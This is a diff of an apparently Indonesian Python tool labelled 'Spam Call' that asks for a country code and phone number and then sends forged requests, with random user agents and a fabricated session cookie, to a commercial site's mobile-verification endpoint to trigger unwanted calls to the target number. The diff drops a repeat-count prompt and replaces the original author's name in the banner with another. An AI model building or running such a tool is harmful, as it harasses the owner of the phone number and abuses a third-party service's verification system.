@@ -7,8 +7,7 @@ class kntl():
         self.acak = random.choice(self.ua)
         self.hh=input('\033[00mCountry Code: \033[96m')                      
         self.number=input('\033[00mPhone Number: \033[96m')
-        self.range=input('\033[00mPengulangan: \033[96m')
-        self.gb=self.hh+self.number+self.range
+        self.gb=self.hh+self.number
         self.smp()
         time.sleep(3)
     def smp(self):
@@ -58,7 +57,7 @@ class kntl():
                 'Cookie': f'PHPSESSID={r}'}
                 rq=requests.get(f'https://id.jagreward.com/member/verify-mobile/{self.number}/', headers=ua).text
 try:
-    print("\033[00m\t<\033[91m/\033[00m>\033[93mSpam Call\033[00m<\033[91m/\033[00m>\n\033[00m\t\033[41;1m   FahmiApz   \033[00m")
+    print("\033[00m\t<\033[91m/\033[00m>\033[93mSpam Call\033[00m<\033[91m/\033[00m>\n\033[00m\t\033[41;1m   Def-Leopard   \033[00m")
     kntl()
     print('\n\033[00mDone.')
     while True:
